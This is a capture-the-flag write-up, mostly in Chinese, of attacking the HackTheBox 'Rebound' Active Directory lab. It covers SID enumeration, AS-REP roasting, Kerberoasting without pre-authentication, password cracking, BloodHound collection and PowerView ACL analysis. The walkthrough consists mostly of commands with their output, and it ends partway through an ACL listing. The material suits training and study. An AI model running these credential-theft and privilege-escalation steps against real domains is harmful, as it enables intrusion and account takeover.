# Rebound



## 1. 信息收集

```
┌──(root㉿kali)-[~]
└─# nmap -sC -sV -T4 -p- 10.10.11.231
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-05 08:41:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-05T08:42:25+00:00; +6h49m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-05T08:42:26+00:00; +6h49m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-05T08:42:25+00:00; +6h49m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-09-05T08:42:26+00:00; +6h49m57s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
49741/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-05T08:42:18
|_  start_date: N/A
|_clock-skew: mean: 6h49m56s, deviation: 0s, median: 6h49m56s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```



## 2. SMB Lookupsid （原理?）

可以匿名登陆SMB服务，发现可以访问Shared文件夹，但是为空。

```
smbclient -L \\\\10.10.11.231\\    
```

```
Password for [WORKGROUP\root]:
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.231 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

可以利用能够匿名访问SMB服务，使用impacket的lookupsid脚本枚举已存在用户的SID (Security Identifier)。

lookupsid.py默认设置最大的RID为4000，此处将RID最大设置为10000。爆破的结果将存在SID的User和Group的名称都显示了出来，将结果中的用户名收集到一个字典中。

```shell
impacket-lookupsid random@10.10.11.231 10000 -no-pass
```

```
impacket-lookupsid nan@10.10.11.231 10000 -no-pass | grep 'SidTypeUser' | sed 's/.*\\\
(.*\) (SidTypeUser)/\1/' > usernames.txt
```

```shell
[*] Brute forcing SIDs at 10.10.11.231
[*] StringBinding ncacn_np:10.10.11.231[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4078382237-1492182817-2568127209
498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: rebound\Administrator (SidTypeUser)
501: rebound\Guest (SidTypeUser)
502: rebound\krbtgt (SidTypeUser)
512: rebound\Domain Admins (SidTypeGroup)
513: rebound\Domain Users (SidTypeGroup)
514: rebound\Domain Guests (SidTypeGroup)
515: rebound\Domain Computers (SidTypeGroup)
516: rebound\Domain Controllers (SidTypeGroup)
517: rebound\Cert Publishers (SidTypeAlias)
518: rebound\Schema Admins (SidTypeGroup)
519: rebound\Enterprise Admins (SidTypeGroup)
520: rebound\Group Policy Creator Owners (SidTypeGroup)
521: rebound\Read-only Domain Controllers (SidTypeGroup)
522: rebound\Cloneable Domain Controllers (SidTypeGroup)
525: rebound\Protected Users (SidTypeGroup)
526: rebound\Key Admins (SidTypeGroup)
527: rebound\Enterprise Key Admins (SidTypeGroup)
553: rebound\RAS and IAS Servers (SidTypeAlias)
571: rebound\Allowed RODC Password Replication Group (SidTypeAlias)
572: rebound\Denied RODC Password Replication Group (SidTypeAlias)
1000: rebound\DC01$ (SidTypeUser)
1101: rebound\DnsAdmins (SidTypeAlias)
1102: rebound\DnsUpdateProxy (SidTypeGroup)
1951: rebound\ppaul (SidTypeUser)
2952: rebound\llune (SidTypeUser)
3382: rebound\fflock (SidTypeUser)
5277: rebound\jjones (SidTypeUser)
5569: rebound\mmalone (SidTypeUser)
5680: rebound\nnoon (SidTypeUser)
7681: rebound\ldap_monitor (SidTypeUser)
7682: rebound\oorend (SidTypeUser)
7683: rebound\ServiceMgmt (SidTypeGroup)
7684: rebound\winrm_svc (SidTypeUser)
7685: rebound\batch_runner (SidTypeUser)
7686: rebound\tbrady (SidTypeUser)
7687: rebound\delegator$ (SidTypeUser)
```



+ **补充知识：SID的定义**

安全主体的SID = 域的SID + 账号的相对标识符RID

> For domain accounts, the SID of a security principal is created by concatenating the SID of the domain with a relative identifier (RID) for the account.
>
> https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers

例如，以下结果是在PowerView中得到的部分用户的SID。

oorend的SID为`S-1-5-21-4078382237-1492182817-2568127209-7682`，fflock的SID为`S-1-5-21-4078382237-1492182817-2568127209-3382`。

它们的前缀相同，最后4位是它们各自的RID。oorend的RID为7682，fflock的RID为3382，这和我们通过lookupsid.py脚本得到的结果一样。

```
PV > Get-DomainGroupMember -Identity servicemgmt
MemberName                  : ppaul
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

MemberName                  : fflock
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-3382

MemberName                  : oorend
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
```



## 2. AS-REP-Roasting with uncrackable password

收集到一系列存在的用户名后，可以尝试进行AS-REP-Roasting攻击，寻找没有设置Pre-Authentication预身份验证的用户。

```shell
impacket-GetNPUsers rebound.htb/ -usersfile usernames.txt -dc-ip 10.10.11.231
```

```sh
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND.HTB:1019fcad9b114a85a86878a129cf7d07$3a980569ef...
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

发现jjones用户未开启pre-auth，获取到使用它密码哈希加密的密文后，尝试爆破密码，然而密码未能破解成功。



## 3. Kerberoasting without credential

无需提供密码的Kerberoasting攻击：最新的研究表示，未开启pre-auth的用户可以直接进行Kerberoasting，而不需要提供credential。

此处需要使用impacket最新版本中的GetUserSPNs.py脚本。

```shell
GetUserSPNs.py -no-preauth jjones -request -usersfile usernames.txt rebound.htb/ -dc-ip 10.10.11.231 
```

或者运行命令

```shell
impacket-GetUserSPNs -dc-ip 10.10.11.231 -target-domain rebound.htb -usersfile usernames.txt  rebound.htb/guest -no-pass
```

得到结果

```shell
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$krbtgt$REBOUND.HTB$*krbtgt*$aa6c0293bd75280b55438fb8$96963...
$krb5tgs$18$DC01$$REBOUND.HTB$*DC01$*$c98bb7d98eafcfd91ffe9d67$d486f39...
[-] Principal: ppaul - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: llune - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: fflock - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: jjones - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: mmalone - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: nnoon - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$ebb77bd4745f266591...
[-] Principal: oorend - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: winrm_svc - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: batch_runner - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: tbrady - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$e42f383d316e70ee973175...
```



### Milestone 1: ldap_monitor password

破解得到`ldap_monitor`的密码为`1GR8t@$$4u`

```
john ldap_monitor_kerberoast.txt -w=/usr/share/wordlists/rockyou.txt 
```





使用最新版Rubeus进行不需要预身份验证的kerberoast攻击，通过wireshark抓包本地连接可以进行流量分析。

```
Rubeus.exe kerberoast /domain:rebound.htb /dc:10.10.11.231 /nopreauth:jjones /spn:ldap_monitor
```

![image-20240905145619414](D:\markdown images\image-20240905145619414.png)





## 4. BloodHound analysis

使用bloodhound

```shell
bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231
```

踩坑：报错中存在KRB_AP_ERR_SKEW(Clock skew too great)，猜测原因是时钟未同步。

![image-20240822144212705](D:\markdown images\image-20240822144212705.png)

执行时钟同步操作后成功

```
ntpdate -u dc01.rebound.htb
```

![image-20240822144332072](D:\markdown images\image-20240822144332072.png)



Shortest Paths to Unconstrained Delegation Systems

![image-20240906115224776](D:\markdown images\image-20240906115224776.png)



注意到：

+ `Service Users`组织单元包含`winrm_svc`用户
+ 而`Servicemgmt`群组对`Service Users`组织单元拥有`GenericAll`权限，这会导致[Descendent Object Takeover](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-GenericAll)。我们的目标是compromise该群组中的一个用户。
+ `oorend`用户对`Servicemgmt`群组拥有`AddSelf`权限。只要将用户`oorend`加入`ServiceMgmt`群组，就能继承对`Service Users`组织单元的`GenericAll`权限，即`FullControl`。
+ DC01.RENOUND.HTB和tbrady用户之间为`HasSession`关系，==todo说明该用户正在登陆域控主机？==
+ `tbrady`用户对`delegator$`拥有`ReadDMSAPassword`权限

![image-20240906150909026](D:\markdown images\image-20240906150909026.png)



+ **补充知识：GenericAll权限**



> With full control of an OU, you may add a new ACE on the OU that will inherit down to the objects under that OU.
>
> The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. 





## 5. Exploit ActiveDirectoryRights 'Self'  

### 5.1 powerview登录ldap_monitor进行信息收集

+ **todo 踩坑点/难点（原理？）**

使用powerview登陆ldap_monitor。失败。

```shell
powerview rebound.htb/ldap_monitor:'1GR8t@$$4u'@dc01.rebound.htb

Bind not successful - invalidCredentials [ERROR_ACCOUNT_LOCKED_OUT]
```

添加`-k`，使用kerberos认证登陆成功。

> This indicates that the LDAP Channel Binding settings are set to "Always", causing the server to
>
> discard any connection from clients that do not provide a token. This will also happen to any query
>
> we may want to perform to LDAP/LDAPS. 
>
> We bypass this constraint with Kerberos authentication, via the -k flag

```shell
powerview rebound.htb/ldap_monitor:'1GR8t@$$4u'@dc01.rebound.htb -k
```

查看ServiceMgmt群组的访问控制权限，从中注意到oorend对ServiceMgmt群组的ActiveDirectoryRights拥有Self权限，这是一个危险的权限。拥有Self权限意味着用户可以将自己加入到该群组中。

```shell
PV > Get-DomainObjectAcl -Identity Servicemgmt
```

```shell
(LDAPS)-[dc01.rebound.htb]-[rebound\ldap_monitor]
PV > Get-DomainObjectAcl -Identity Servicemgmt
ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : Self
AccessMask                  : 0x8
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : None
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : 46a9b11d-60ae-405a-b7e8-ff8a58d456d2
InheritanceType             : None
SecurityIdentifier          : BUILTIN\Windows Authorization Access Group (S-1-5-32-560)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : None
AccessMask                  : ControlAccess
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : ab721a55-1e2f-11d0-9819-00aa0040529b
InheritanceType             : None
SecurityIdentifier          : Authenticated Users (S-1-5-11)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : Domain Admins (S-1-5-21-4078382237-1492182817-2568127209-512)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : Account Operators (S-1-5-32-548)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : Read
AccessMask                  : 0x20094
InheritanceType             : None
SecurityIdentifier          : Principal Self (S-1-5-10)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : Read
AccessMask                  : 0x20094
InheritanceType             : None
SecurityIdentifier          : Authenticated Users (S-1-5-11)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : Local System (S-1-5-18)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 4c164200-20c0-11d0-a768-00aa006e0529
InheritanceType             : 4828cc14-1437-45bc-9b07-ad6f015e5f28
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 4c164200-20c0-11d0-a768-00aa006e0529
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 5f202010-79a5-11d0-9020-00c04fc2d4cf
InheritanceType             : 4828cc14-1437-45bc-9b07-ad6f015e5f28
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 5f202010-79a5-11d0-9020-00c04fc2d4cf
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
InheritanceType             : 4828cc14-1437-45bc-9b07-ad6f015e5f28
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : bc0ac240-79a9-11d0-9020-00c04fc2d4cf
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
InheritanceType             : 4828cc14-1437-45bc-9b07-ad6f015e5f28
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 59ba2f42-79a2-11d0-9020-00c04fc2d3cf
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 037088f8-0ae1-11d2-b422-00a0c968f939
InheritanceType             : 4828cc14-1437-45bc-9b07-ad6f015e5f28
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 037088f8-0ae1-11d2-b422-00a0c968f939
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access (S-1-5-32-554)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ReadProperty, WriteProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritanceType             : None
SecurityIdentifier          : Key Admins (S-1-5-21-4078382237-1492182817-2568127209-526)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ReadProperty, WriteProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : 5b47d60f-6090-40b2-9f37-2a4de88f3063
InheritanceType             : None
SecurityIdentifier          : Enterprise Key Admins (S-1-5-21-4078382237-1492182817-2568127209-527)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : Self
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 9b026da6-0d3c-465c-8bee-5199d7165cba
InheritanceType             : bf967a86-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : Creator Owner (S-1-3-0)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : Self
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : 9b026da6-0d3c-465c-8bee-5199d7165cba
InheritanceType             : bf967a86-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : Principal Self (S-1-5-10)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritanceType             : bf967a86-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : Enterprise Domain Controllers (S-1-5-9)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritanceType             : bf967a9c-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : Enterprise Domain Controllers (S-1-5-9)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : b7c69e6d-2cc7-11d2-854e-00a0c983f608
InheritanceType             : bf967aba-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : Enterprise Domain Controllers (S-1-5-9)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : WriteProperty
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT, ACE_INHERITED_OBJECT_TYPE_PRESENT
ObjectAceType               : ea1b7b93-5e48-46d5-bc6c-4df4fda78a35
InheritanceType             : bf967a86-0de6-11d0-a285-00aa003049e2
SecurityIdentifier          : Principal Self (S-1-5-10)

ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERIT_ONLY_ACE, INHERITED_ACE
AccessMask                  : ReadProperty
